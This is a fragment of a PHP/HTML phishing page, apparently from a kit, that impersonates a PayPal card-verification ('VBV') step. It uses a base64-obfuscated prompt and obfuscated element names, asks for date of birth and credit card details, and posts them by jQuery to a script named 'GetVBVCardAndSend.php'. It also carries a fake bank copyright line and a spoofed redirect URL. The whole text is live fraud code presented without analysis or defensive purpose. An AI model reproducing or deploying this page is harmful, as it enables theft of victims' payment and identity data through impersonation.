...
<body>
	<div style="padding:0px 34% 50px">
		<div class="dmVyaWZjYXRpb25Qb3N0U2VjbHJ0">
			...
			<p class="bGFiVGhpc2Zvcm1zZ2lucGFnZXZidg"><?echo base64_decode('UGxlYXNlIGVudGVyIGluZm9ybWF0aW9uIHBlcnRhaW5pbmcgdG8geW91ciBjcmVkaXQgY2FyZCB0byBhZGQgaXQgaW4geW91ciBQYXlQYWwgYWNjb3VudA==');?></p>
			<div id="VGhpc0ZvckZ1Y2tpbmdwcm9jZXNzaW5n">
				<center>
					<tr>
						<p style="margin: 91px 0 129px;">processing ...</p>
					</tr>
				</center>
			</div>
				...
				<table align="center" width="290" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 30px;">
					<form method="post" id="FORM1">
						<tbody style="height:8px;">
							...
							<tr>
								<td align="right">Date Of &Beta;irth : </td>
								<td>
							...
							<?php
								echo VBV::InputCard($CardCountry);
							?>
							<tr>
								<td>
								</td>
								<td>
									<br><input type="submit" value="Submit" id="bntvbv">
								</td>
							</tr>
						</tbody>
					</form>
			...
			<p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565">&copy; 2017 Bank check.All Rights Reserved</p>
		</div>
	</div>
	<script>
		$("#FORM1").validate({
	        submitHandler: function(form) {
	            $.post("System/GetVBVCardAndSend.php", $("#FORM1").serialize(), function(result) {
	                if (result == "YOUHAVEERRORBRO") {
						...
						setTimeout(function() {
							//window.location.assign("thanks.php?cmd=_Restore_Start&_Acess_Tooken="+makeid());
							alert("done");
	                    });
	                }
	            });
